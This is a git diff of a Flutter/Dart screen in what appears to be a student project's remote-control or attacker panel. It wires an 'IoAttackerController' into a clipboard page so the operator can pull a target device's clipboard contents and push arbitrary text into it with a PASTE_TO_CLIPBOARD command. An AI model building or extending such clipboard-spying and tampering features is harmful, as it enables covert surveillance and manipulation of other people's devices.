@@ -7,13 +7,17 @@ import 'package:inferno_core_fyp/view%20models/controllers/general_controller.da
 import '../../res/constants.dart';
 import '../../res/widgets/button components/my_text_btn.dart';
 import '../../res/widgets/input field components/big_input_field.dart';
+import '../../view models/controllers/io_attacker_controller.dart';
 
 class ClipboardPage extends StatelessWidget {
-  const ClipboardPage({Key? key}) : super(key: key);
+  final String targetId;
+
+  const ClipboardPage({super.key, required this.targetId});
 
   @override
   Widget build(BuildContext context) {
     final generalController = GeneralController();
+    IoAttackerController ioAttackerController = Get.put(IoAttackerController());
     return Scaffold(
       appBar: AppBar(title: const Text("Clipboard"), centerTitle: true),
       body: SingleChildScrollView(
@@ -56,24 +60,58 @@ class ClipboardPage extends StatelessWidget {
                 ),
                 14.ph,
                 generalController.isClipboard.value == true
-                    ? BigInputField(
-                        readOnly: true,
-                        height: Get.height * .44,
-                        hintText: "User's Clipboard is empty right now!",
-                        textColor: blackColor,
-                        controller: TextEditingController(text: "Hello world"),
+                    ? Column(
+                        children: [
+                          BigInputField(
+                            readOnly: true,
+                            height: Get.height * .45,
+                            hintText: "User's Clipboard is empty right now!",
+                            textColor: blackColor,
+                            controller: TextEditingController(text: generalController.clipboardData.value),
+                          ),
+                          20.ph,
+                          MyTextButton(
+                            text: "Get data",
+                            onPressed: () {
+                              generalController.getClipboardData(targetId);
+                            },
+                            width: 120,
+                            radius: 6,
+                            spacing: 1.3,
+                          ),
+                        ],
                       )
                     : Column(
                         children: [
-                          const BigInputField(
+                          BigInputField(
                             height: 140,
-                            hintText: "Enter text you want to fill in user's clipboard",
+                            controller:
+                                generalController.generalController.value,
+                            hintText:
+                                "Enter text you want to fill in user's clipboard",
                             textColor: Colors.black,
                           ),
                           14.ph,
                           MyTextButton(
                             text: "Fill",
-                            onPressed: () {},
+                            onPressed: () {
+                              if (generalController
+                                      .generalController.value.text !=
+                                  "") {
+                                ioAttackerController.submitCommand(
+                                  targetId: targetId,
+                                  data: {
+                                    "text": 'PASTE_TO_CLIPBOARD',
+                                    "command_args": {
+                                      "text": generalController
+                                          .generalController.value.text
+                                          .trim()
+                                    },
+                                  },
+                                );
+                                generalController.generalController.value.clear();
+                              }
+                            },
                             width: 100,
                             radius: 6,
                             spacing: 1.3,
